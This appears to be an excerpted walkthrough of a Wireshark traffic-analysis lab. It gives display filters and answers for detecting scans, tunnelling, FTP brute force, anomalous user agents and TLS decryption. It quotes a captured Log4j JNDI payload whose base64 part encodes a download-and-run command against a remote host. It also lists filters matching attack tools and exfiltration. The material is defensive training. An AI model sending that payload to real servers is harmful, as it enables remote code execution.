...
![Wireshark Nmap UDP Scan ICMP Correlation](Images/Wireshark_Nmap_UDP_Scan_ICMP_Correlation.png)
...
- "**DHCP Request**" packets (`dhcp.option.dhcp == 3`) contain the hostname information
- "**DHCP ACK**" packets (`dhcp.option.dhcp == 5`) represent the accepted requests
- "**DHCP NAK**" packets (`dhcp.option.dhcp == 6`) represent denied requests
...
To search for hostnames in DHCP-requests:  
...
To search for domain names in DHCP ACKs  
...
To search for NetBIOS/NBNS name  
`nbns.name contains "keyword"`

![Wireshark NBNS Search](Images/Wireshark_NBNS_Search.png)
...
To search for a specific Kerberos username  
...
To search for Kerberos usernames (excl. host/machine names)
...
![Wireshark Kerberos Search](Images/Wireshark_Kerberos_Search.png)
...
Hint: Filtering a pattern rather than actual value can help.

Setting a display filter of `dhcp.option.hostname matches "galaxy"` results in three matching packets:

- A DHCP Discover and Request from the hostname Galaxy-A12
- A DHCP Request from the hostname Anthony-s-Galaxyy-A30s

Then select the last packet and check the client MAC address which is `9a:81:41:cb:96:6c`

Answer: `9a:81:41:cb:96:6c`

#### How many NetBIOS registration requests does the "LIVALJM" workstation have?

Hint: "nbns.flags.opcode == 5" filter can help.
...
Set a display filter of `dhcp.option.dhcp == 3 && dhcp.option.requested_ip_address == 172.16.13.85` and check the hostname (DHCP Option 12) for the only matching packet.

Note that there are no quotes (`"`) around the IP-address!
...
Set a display filter of `kerberos.msg_type == 10 && kerberos.CNameString == "u5"` and check the source IP of the matching packets.  
Defang the IP-address by adding '[' and ']' around each period. That is `.` becomes `[.]`.

Answer: `10[.]1[.]12[.]2`

#### What is the hostname of the available host in the Kerberos packets?

Set a display filter of `kerberos.CNameString contains "$"` and check the CNameString in the matching packet.
...
To search for possible ICMP tunnelling  
`icmp and data.len > 64`

![Wireshark Possible ICMP Tunnelling](Images/Wireshark_Possible_ICMP_Tunnelling.png)
...
![Wireshark Possible DnsCat Tunnelling](Images/Wireshark_Possible_DnsCat_Tunnelling.png)
...
Set a display filter of `icmp and data.len > 64` and analyse the `Data` part of the resulting ICMP packets.

I packet number 48 we find the following data:

```text
0000   45 00 03 44 39 84 40 00 40 06 e7 6f 0a 5f 01 02   E..D9.@.@..o._..
0010   0a 5f 01 01 00 16 c8 8b 0e 1b bf cb 31 7d 56 e2   ._..........1}V.
0020   80 18 01 f6 e4 90 00 00 01 01 08 0a 00 6d 86 46   .............m.F
<---snip--->
...
02f0   68 6d 61 63 2d 6d 64 35 2d 39 36 00 00 00 15 6e   hmac-md5-96....n
0300   6f 6e 65 2c 7a 6c 69 62 40 6f 70 65 6e 73 73 68   one,zlib@openssh
0310   2e 63 6f 6d 00 00 00 15 6e 6f 6e 65 2c 7a 6c 69   .com....none,zli
0320   62 40 6f 70 65 6e 73 73 68 2e 63 6f 6d 00 00 00   b@openssh.com...
0330   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0340   00 00 00 00                                       ....
```

So the tunneled protocol must be SSH.
...
Hint: Investigate the anomalous packets. What is the suspicious main domain address that receives anomalous DNS queries? (Enter the address in defanged format.)

Set a display filter of `dns.qry.name.len > 64 and !mdns` and check the query names (`dns.qry.name` field).  
The names are all of the form `<hexdigits>.dataexfil.com`
...
**FTP response codes** for grabbing the low-hanging fruits:
...
- **Password spray signal**: List targets for a static password (`(ftp.request.command == "PASS" ) and (ftp.request.arg == "password")`)

![Wireshark FTP Bruteforce Attack](Images/Wireshark_FTP_Bruteforce_Attack.png)
...
Set a display filter of `ftp.response.code == 530` and check the status bar value for `Displayed`.

Answer: `737`

#### What is the size of the file accessed by the "ftp" account?

Hint: Filtering the response code "213" can help.

We start by searching for FTP sessions where the FTP user `ftp` logged in (`ftp.request.command == "USER" && ftp.request.arg == "ftp"`).  
There is only one session.

Right-click on the matching packet and select `Follow` -> `TCP Stream`. We filter on TCP-stream number 714.
...
As far as I can see two files (`resume.doc` and `README`) are accessed but the `SIZE` command is only issued once
...
See the FTP-session above.

Actually, the file uploaded (with the `STOR` [command](https://www.iana.org/assignments/ftp-commands-extensions/ftp-commands-extensions.xhtml#ftp-commands-extensions-2)) is `README`.
...
The file `resume.doc` is downloaded (with the `RETR` command). However, THM considers this the correct answer!?
...
The adversary tried to change the file permissions on the file but was denied.
...
- GET requests only (`http.request.method == "GET"`)
- POST requests only (`http.request.method == "POST"`)
...
- **404 Not Found**: Server can't find the requested URL (`http.response.code == 404`)
...
- **Host**: Hostname of the server (`http.host contains "keyword"` or `http.host == "keyword"`)
...
- **HTML Form URL Encoded**: Web form information (`urlencoded-form`)
...
Filter example that search for common web tools:  
`(http.user_agent contains "sqlmap") or (http.user_agent contains "Nmap") or (http.user_agent contains "Wfuzz") or (http.user_agent contains "Nikto")`

![Wireshark User-Agent Analysis](Images/Wireshark_User-Agent_Analysis.png)
...
![Wireshark Log4j Analysis](Images/Wireshark_Log4j_Analysis.png)
...
1. The answer is not the number of packets. It is the number of anomalous user-agent types.
2. You need to filter the "user agent" info "as a column" and conduct a manual investigation of the packet details to spot the anomalies.
3. In addition to the obvious "non-standard" and modified user agent types: Does "Windows NT 6.4" exist?

Filter for all packet with a User-Agent string with `http.user_agent`, add the user-agent as a column, and sort on this column.

Manually going through the user-agents we find these anomalous ones:

- `${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}` (Log4j attack)
- `Mozilla/5.0 (Windows; U; Windows NT 6.4; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.237 Safari/534.10` (non-existent [Windows NT version](https://en.wikipedia.org/wiki/Windows_NT))
- `Mozlila/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0` (Mozilla misspelling)
- `Nmap Scripting Engine; https://nmap.org/book/nse.html)` (Nmap script)
- `Wfuzz/2.4` (Wfuzz tool)
- `sqlmap/1.4#stable (http://sqlmap.org)` (SqlMap tool)

Answer: `6`

#### What is the packet number with a subtle spelling difference in the user agent field?

The user-agent `Mozlila/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0` is in packet number 52.
...
Set a display filter of `ip contains "jndi"` and check the packets numbers.
...
The user-agent string is `${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}` and this decodes to

```bash
┌──(kali㉿kali)-[~]
└─$ echo 'd2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==' | base64 -d                    
...
![Wireshark TLS Analysis 1](Images/Wireshark_TLS_Analysis_1.png)
...
![Wireshark TLS Analysis 2](Images/Wireshark_TLS_Analysis_2.png)
...
![Wireshark TLS Analysis 3](Images/Wireshark_TLS_Analysis_3.png)

Adding key log files with the "Edit --> Preferences --> Protocols --> TLS" menu:

![Wireshark TLS Analysis 4](Images/Wireshark_TLS_Analysis_4.png)

Viewing the traffic with/without the key log files:

![Wireshark TLS Analysis 5](Images/Wireshark_TLS_Analysis_5.png)
...
Set a display filter of `tls.handshake.extensions_server_name == "accounts.google.com"` and check the packet number of the matching packet.

Answer: `16`

#### Decrypt the traffic with the "KeysLogFile.txt" file. What is the number of HTTP2 packets?

Hint: Import the key file to decrypt the traffic.

Import the TLS-key:

1. Select `Preferences...` in the `Edit` menu
2. Expand `Protocols`, scroll down to `TLS` and select it
3. Under `(Pre)-Master-Secret log filename` click on `Browse...` and select the `KeysLogFile.txt` file
4. Click `OK`

Set a display filter of `http2` and check the status bar value for `Displayed`.

Answer: `115`

#### Go to Frame 322. What is the authority header of the HTTP2 packet? (Enter the address in defanged format.)

Press `Ctrl + G` and enter `322` in the text box to go to the packet.

Expand the packet data in the packet details pane:

- HyperText Transer Protocol 2
  - Stream
    - Header: :authority:

Check the value and defang the name.

Answer: `safebrowsing[.]googleapis[.]com`

#### Investigate the decrypted packets and find the flag! What is the flag?

Hint: You can export objects after decrypting the traffic.

1. Select `Export Objects -> HTTP...` in the `File` menu.
2. Select the file with a hexlike filename and click `Save`.
3. Open the file in a text-editor and you find the flag in cleartext at the top of the document.
...
![Wireshark Credentials View](Images/Wireshark_Credentials_View.png)
...
Hint: "Tools --> Credentials" can help.

Select `Credentials` in the `Tools` menu and get this window

![Wireshark Credentials View 2](Images/Wireshark_Credentials_View_2.png)
...
![Wireshark Firewall ACL Rules](Images/Wireshark_Firewall_ACL_Rules.png)
...
Hint: "Tools --> Firewall ACL Rules" can help.

1. Press `Ctrl + G` and enter `99` in the text box to go to the packet.
2. Select `Firewall ACL Rules` in the `Tools` menu
3. Select `IPFirewall (ipfw)` in the drop-down box at the bottom of the window

```text
# IPFirewall (ipfw) rules for Bonus-exercise.pcap, packet 99.

# IPv4 source address.
add deny ip from 10.121.70.151 to any in

# IPv4 destination address.
add deny ip from 10.234.125.254 to any in
<---snip--->
```
...
Hint: "Deny" option can help.

1. Press `Ctrl + G` and enter `231` in the text box to go to the packet.
2. Select `Firewall ACL Rules` in the `Tools` menu
3. Select `IPFirewall (ipfw)` in the drop-down box at the bottom of the window
4. Disable the `Deny` checkbox

```text
# IPFirewall (ipfw) rules for Bonus-exercise.pcap, packet 231.

# IPv4 source address.
add allow ip from 10.121.70.151 to any in

<---snip--->

# MAC source address.
add allow MAC 00:01:96:3c:3f:a8 any in
